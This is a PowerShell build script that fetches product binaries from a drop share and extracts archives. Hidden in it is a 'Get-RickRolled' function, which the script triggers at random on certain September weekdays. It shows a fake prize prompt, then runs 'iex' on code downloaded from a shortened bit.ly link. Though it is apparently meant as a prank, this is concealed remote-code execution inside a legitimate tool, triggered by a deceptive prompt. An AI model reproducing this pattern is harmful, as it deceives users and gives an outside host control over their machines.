<# 
.Synopsis 
    Acquire build artifacts from the specified drop location.
.Description    
    Copy the build artifacts from the specified drop location to the specified binaries directory, and exctract any archives retrieved.
.Example
    Get-Product -binariesDirectory C:\TFS\ExpertSuite\<branch name>\Binaries -$dropRoot \\dfs.aderant.com\ExpertSuite -branch <branch name>
.Example
    Get-Product -binariesDirectory C:\TFS\ExpertSuite\<branch name>\Binaries -$dropRoot \\dfs.aderant.com\ExpertSuite -pullRequestId 19159
.Parameter binariesDirectory
    The directory you want the binaries to be copied too
.Parameter dropRoot
    The path drop location that the binaries will be fetched from
.Parameter branch
    The branch to retrieve build artifacts from.
.Parameter pullRequestId
    The pull request id to retrieve build artifacts from.
.Parameter components
    The list of components to retrieve from the drop location. Defaults to 'Product'.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory,
    [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$dropRoot,
    [Parameter(Mandatory=$false, ParameterSetName = "Branch")][ValidateNotNullOrEmpty()][string]$branch,
    [Parameter(Mandatory=$false, ParameterSetName = "PullRequest")][Alias("pull")][int]$pullRequestId,
    [Parameter(Mandatory=$false)][ValidateNotNullOrEmpty()][ValidateSet("Product", "Test")][string[]]$components = @("Product")
)

begin {
    $ErrorActionPreference = "Stop"
    . "$PSScriptRoot\..\Build\Build-Libraries.ps1"
    Set-StrictMode -Version Latest

    Write-Host "Running '$($MyInvocation.MyCommand.Name.Replace(`".ps1`", `"`"))' with the following parameters:" -ForegroundColor Cyan

    foreach ($parameter in $MyInvocation.MyCommand.Parameters) {
        Write-Host (Get-Variable -Name $Parameter.Values.Name -ErrorAction SilentlyContinue | Out-String)
    }

    function Clear-Environment {
        <#
        .Synopsis
            Clears the specified directory.
        #>
        [CmdletBinding()]
        param (
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory,
            [Parameter(Mandatory=$false)][string[]]$exclusions = @("environment.xml", "cms.ini")
        )

        process {
            if (Test-Path $binariesDirectory) {
                Write-Host "Clearing directory: $($binariesDirectory)"
                Remove-Item $binariesDirectory\* -Recurse -Force -Exclude $exclusions
            }

            [string]$expertSourceDirectory = Join-Path -Path $binariesDirectory -ChildPath "ExpertSource"
            [string]$logDirectory = Join-Path -Path $binariesDirectory -ChildPath "Logs"

            New-Item -Path $logDirectory -ItemType Directory | Out-Null
            New-Item -Path $expertSourceDirectory -ItemType Directory | Out-Null
        }
    }

    function Copy-Binaries {
        <#
        .Synopsis
            Acquires binaries from the specified drop location.
        #>
        [CmdletBinding()]
        param (
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$binariesDirectory,
            [Parameter(Mandatory=$true)][ValidateNotNullOrEmpty()][string]$dropRoot,
            [Parameter(Mandatory=$false)][ValidateNotNullOrEmpty()][string[]]$components,
            [switch]$clearBinariesDirectory
        )

        begin {
            $components = $components | Sort-Object -Unique
        }

        process {
            if ($clearBinariesDirectory.IsPresent) {
                Clear-Environment -binariesDirectory $binariesDirectory
            }

            [double]$totalTime = 0

            foreach ($component in $components) {
                [string]$componentPath = Join-Path -Path $dropRoot -ChildPath $component

                if (-not (Test-Path $componentPath)) {
                    Write-Error "Directory: '$componentPath' does not exist."
                    exit 1
                }

                [System.IO.FileInfo[]]$binaries = Get-ChildItem -Path $componentPath -File
                
                Write-Host "`r`nCopying files:"
                Write-Host ($binaries.FullName | Format-List | Out-String)
                Write-Host "`r`nTo directory:"
                Write-Host "$binariesDirectory`r`n"
        
                [TimeSpan]$executionTime = Measure-Command { ForEach-Object -InputObject $binaries { Copy-Item -Path $_.FullName -Destination $binariesDirectory } }
                Write-Host "Acquired $component in: $([System.Math]::Round($executionTime.TotalSeconds, 2)) seconds.`r`n" -ForegroundColor Cyan
                $totalTime = $totalTime + [System.Math]::Round($executionTime.TotalSeconds, 2)
            }
        }

        end {
            if ($components.Count -gt 1) {
                Write-Host "Total binary acquisition time: $totalTime seconds." -ForegroundColor Cyan
            }
        }
    }

    function Export-Archives {
        <#
        .Synopsis
            Extracts all archives in the binaries directory.
        #>
        begin {
            [string]$zipExe = Join-Path -Path "$PSScriptRoot\..\Build.Tools" -ChildPath "\7z.exe"
        }
        
        process {
            if (-not (Test-Path $zipExe)) {
                Write-Error "7-Zip executable not present at: '$zipExe'."
                exit 1
            }

            [System.IO.FileInfo[]]$archives = Get-ChildItem -Path $binariesDirectory -File -Filter "*.zip"

            if ($null -eq $archives) {
                Write-Warning "No archives discovered at path: '$binariesDirectory'."
                return
            }

            foreach ($archive in $archives) {
                & $zipExe x $archive.FullName "-o$binariesDirectory" -y
            }
        }
    }

    function Get-RickRolled {
        <#
        .Synopsis
            Invokes Rick Astley.
        #>
        begin {
            [string]$title = "Claim prize?"
            [string]$message = "You have won a prize!!! Do you want to claim it?"
        }

        process {
            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes"
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No"
        
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
            switch ($result) {
                0 {Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')' }
            }
        }
    }
}


process {
    switch ($PSCmdlet.ParameterSetName) {
        "Branch" {
            [string]$branchDropRoot = Join-Path -Path $dropRoot -ChildPath "product\refs\heads\$branch"
            [string]$build = Join-Path $branchDropRoot -ChildPath (Get-ChildItem -Path $branchDropRoot -Directory | Sort-Object -Property Name | Select-Object -First 1)

            Copy-Binaries -dropRoot $build -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory
        }
        "PullRequest" {
            # ToDo: Remove a pulls from this path.
            [string]$pullRequestDropRoot = Join-Path -Path $dropRoot -ChildPath "pulls\pulls\$pullRequestId"

            Copy-Binaries -dropRoot $pullRequestDropRoot -binariesDirectory $binariesDirectory -components $components -clearBinariesDirectory
        }
    }

    Export-Archives
}

end {
    Write-Host "`r`nProduct retrieved.`r`n" -ForegroundColor Cyan

    if ([System.Environment]::UserInteractive -and $host.Name -eq "ConsoleHost") {
        [bool]$psInteractive = (-not [System.Environment]::GetCommandLineArgs() -Contains '-NonInteractive')

        if ($psInteractive -and (Get-Random -Maximum 2 -Minimum 0) -eq 1) {
            if ([System.DateTime]::Now.Month -eq 9 -and ([System.DateTime]::Now.DayOfWeek -in [System.DayOfWeek]::Monday,[System.DayOfWeek]::Tuesday,[System.DayOfWeek]::Wednesday)) {
                Get-RickRolled
            }
        }
    }

    exit $LASTEXITCODE
}